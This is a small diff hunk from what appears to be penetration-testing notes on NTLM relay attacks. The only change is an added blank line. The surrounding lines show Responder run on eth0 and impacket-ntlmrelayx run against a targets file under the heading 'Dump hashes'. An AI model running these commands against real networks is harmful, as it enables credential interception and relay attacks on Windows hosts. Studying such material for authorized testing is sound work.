@@ -27,6 +27,7 @@ Run responder
 sudo responder -I eth0 -wv
 ```
 Start ntlmrelayx with any of these options
+
 **Dump hashes**
 ```bash
 sudo impacket-ntlmrelayx -tf targets.txt -smb2support
